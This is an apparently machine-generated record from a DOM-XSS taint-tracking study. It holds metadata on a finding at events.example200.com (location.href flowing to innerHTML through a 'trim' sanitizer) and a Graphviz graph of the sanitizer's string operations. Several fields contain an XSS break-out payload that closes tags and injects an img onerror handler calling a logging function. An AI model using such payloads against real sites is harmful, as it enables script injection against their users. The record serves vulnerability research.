// Finding: af3c7320-441b-431d-8fe5-0e5543d4b1ec
// Finding.url: https://events.example200.com/#!view/event/event_id/89873"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('f3da0f2b49dc4974b022a1129ec5c18a')><!--/*
// Finding.parentloc: https://events.example200.com/#!view/event/event_id/89873"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('f3da0f2b49dc4974b022a1129ec5c18a')><!--/*
// Finding.domain: events.example200.com
// Finding.base_domain: example200.com
// Finding.source: location.href
// Finding.sink: innerHTML
// Sanitizer.score: 3
// Sanitizer.name: trim
// Sanitizer.location: https://events.example200.com/live/resource/js/%5Clivewhale%5Cthirdparty%5Cfrontend.min.js/%5Clivewhale%5Cscripts%5Clwui%5Cfrontend.js/%5Clivewhale%5Cscripts%5Ccommon.rev.1528626687.js - trim:7:14492
// Finding.begin: 3
// Finding.end: 8
// Finding.original_uuid: 338bd3fc-fbb9-4d67-82c5-f2515e466c05
// Finding.TwentyFiveMillionFlowsId: -1532724413
// Finding.script: https://events.example200.com/live/resource/js/%5Clivewhale%5Cthirdparty%5Cfrontend.min.js/%5Clivewhale%5Cscripts%5Clwui%5Cfrontend.js/%5Clivewhale%5Cscripts%5Ccommon.rev.1528626687.js
// Finding.line: 8
// Exploit.uuid: f3da0f2b-49dc-4974-b022-a1129ec5c18a
// Exploit.success: false
// Exploit.status: validated
// Exploit.method: C
// Exploit.type: html
// Exploit.token: attribute
// Exploit.content: href
// Exploit.quote_type: "
// Exploit.tag: a
// Exploit.break_out: 89873"></iframe></style></script></object></embed></textarea><img src=x onerror=
// Exploit.break_in: ><!--/*
// Exploit.payload: 89873"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
// Exploit.begin_taint_url: 50
// Exploit.end_taint_url: 55
// Exploit.replace_begin_url: 50
// Exploit.replace_end_url: 55
// Exploit.replace_begin_param: 5060
// Exploit.replace_end_param: 5065
// Issues.LargestEncodeAttrStringChain: 0
// Issues.LargestTextFragmentEncodeChainLength: 0
// Issues.HasApproximation: false
// Issues.HasMissingImplementation: false
// Issues.HasInfiniteRegexWithFunctionReplacer: false
// Issues.MergedSplitAndJoins: false
// Issues.HasUrlInRhsOfReplace: false
// Issues.HasUrlInLhsOfReplace: false
// Issues.HasCookieValueInLhsOfreplace: false
// Issues.HasCookieValueInRhsOfreplace: false
// Issues.HasCookieValueInMatchPattern: false
// Issues.HasCookieValueInExecPattern: false
// Issues.RemovedLRConcats: false
// Issues.RemovedReplaceArtifacts: false
// Issues.HasUrlInMatchPattern: false
// Issues.HasUrlInExecPattern: false
// Issues.RemovedNOPreplaces: false
// Issues.Known_sanitizer: false
// DepGraph.hash: 644917075
// DepGraph.sanitizer_hash: -1337210880

digraph cfg {
n0 [shape=house, label="Input: x"];
n1 [shape=ellipse, label="split"];
n2 [shape=box, label="Lit: #"];
n3 [shape=box, label="Var: x"];
n4 [shape=ellipse, label="str_replace_once"];
n5 [shape=box, label="RegExp: /^!/"];
n6 [shape=box, label="Lit: "];
n7 [shape=box, label="Var: x"];
n8 [shape=ellipse, label="split"];
n9 [shape=box, label="Lit: /"];
n10 [shape=box, label="Var: x"];
n11 [shape=ellipse, label="decodeURIComponent"];
n12 [shape=box, label="Var: x"];
n13 [shape=ellipse, label="."];
n14 [shape=box, label="Lit: &lt;"];
n15 [shape=ellipse, label="preg_replace"];
n16 [shape=box, label="RegExp: /[<]/"];
n17 [shape=box, label="Lit: &lt;"];
n18 [shape=box, label="Var: x"];
n19 [shape=ellipse, label="."];
n20 [shape=box, label="Lit: &gt;"];
n21 [shape=ellipse, label="."];
n22 [shape=box, label="Lit: &lt;"];
n23 [shape=ellipse, label="preg_replace"];
n24 [shape=box, label="RegExp: /[>]/"];
n25 [shape=box, label="Lit: &gt;"];
n26 [shape=box, label="Var: x"];
n27 [shape=ellipse, label="."];
n28 [shape=box, label="Lit: <p>"];
n29 [shape=ellipse, label="."];
n30 [shape=box, label="Lit: </p>"];
n31 [shape=ellipse, label="preg_replace"];
n32 [shape=box, label="RegExp: /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/"];
n33 [shape=box, label="Lit: "];
n34 [shape=box, label="Var: x"];
n35 [shape=box, label="Var: x"];
n36 [shape=doubleoctagon, label="Return: x"];
n3 -> n0;
n1 -> n2;
n1 -> n3;
n7 -> n1;
n4 -> n5;
n4 -> n6;
n4 -> n7;
n10 -> n4;
n8 -> n9;
n8 -> n10;
n12 -> n8;
n11 -> n12;
n13 -> n11;
n13 -> n14;
n18 -> n13;
n15 -> n16;
n15 -> n17;
n15 -> n18;
n19 -> n15;
n19 -> n20;
n21 -> n19;
n21 -> n22;
n26 -> n21;
n23 -> n24;
n23 -> n25;
n23 -> n26;
n27 -> n28;
n27 -> n23;
n29 -> n27;
n29 -> n30;
n34 -> n29;
n31 -> n32;
n31 -> n33;
n31 -> n34;
n35 -> n31;
n36 -> n35;
}